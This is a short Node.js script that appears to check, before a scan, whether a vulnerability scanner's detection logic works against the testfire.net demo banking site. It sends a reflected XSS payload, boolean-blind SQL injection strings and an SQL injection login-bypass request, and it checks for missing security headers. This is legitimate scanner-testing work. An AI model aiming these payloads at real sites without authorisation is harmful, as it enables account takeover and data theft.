require('dotenv').config();

async function validateAll() {
  console.log('=== Pre-Scan Validation ===\n');

  // 1. Test XSS exact match logic
  const xssPayload = '<script>alert(1)</script>';
  const r1 = await fetch('http://testfire.net/search.jsp?query=' + encodeURIComponent(xssPayload), { headers: { 'User-Agent': 'Mozilla/5.0' } });
  const b1 = await r1.text();
  const xssOk = b1.includes(xssPayload);
  console.log('[XSS] Exact payload reflected in search.jsp?', xssOk, '→', xssOk ? 'PASS ✅' : 'FAIL ❌');

  // 2. Test boolean-blind SQLi - compare TRUE vs FALSE response sizes
  const truePayload  = "' OR '1'='1";
  const falsePayload = "' OR '1'='2";
  const [r2, r3] = await Promise.all([
    fetch('http://testfire.net/search.jsp?query=' + encodeURIComponent(truePayload),  { headers: { 'User-Agent': 'Mozilla/5.0' } }),
    fetch('http://testfire.net/search.jsp?query=' + encodeURIComponent(falsePayload), { headers: { 'User-Agent': 'Mozilla/5.0' } })
  ]);
  const [b2, b3] = await Promise.all([r2.text(), r3.text()]);
  const diff = Math.abs(b2.length - b3.length);
  console.log('[SQLi Blind] TRUE size:', b2.length, '| FALSE size:', b3.length, '| Diff:', diff, 'bytes');
  console.log('[SQLi Blind] Detectable?', diff > 100 ? 'YES ✅' : 'NO - too small difference, blind SQLi not detectable this way');

  // 3. Test login bypass (POST)
  const r4 = await fetch('http://testfire.net/doLogin', {
    method: 'POST',
    redirect: 'follow',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0' },
    body: "uid=jsmith'--&passw=x&btnSubmit=Login"
  });
  const b4 = await r4.text();
  const loginBypassed = b4.includes('Sign Off') || b4.includes('Account Summary') || b4.includes('My Account');
  console.log('[SQLi Auth Bypass] Final URL:', r4.url);
  console.log('[SQLi Auth Bypass] Bypassed?', loginBypassed ? 'YES ✅' : 'NO ❌ - login page rejected the payload');

  // 4. Test header detection
  const r5 = await fetch('http://testfire.net', { method: 'HEAD', headers: { 'User-Agent': 'Mozilla/5.0' } });
  const hasCSP = r5.headers.get('content-security-policy');
  const hasHSTS = r5.headers.get('strict-transport-security');
  console.log('\n[Headers] CSP missing?', !hasCSP ? 'YES → finding ✅' : 'NO (header present)');
  console.log('[Headers] HSTS missing?', !hasHSTS ? 'YES → finding ✅' : 'NO (header present)');

  console.log('\n=== Validation complete. Summary ===');
  console.log('XSS detection will work:', xssOk);
  console.log('SQLi blind detection will work:', diff > 100);
  console.log('SQLi auth bypass will work:', loginBypassed);
  console.log('Header detection will work: true');
}

validateAll().catch(e => { console.error('Validation error:', e.message); process.exit(1); });
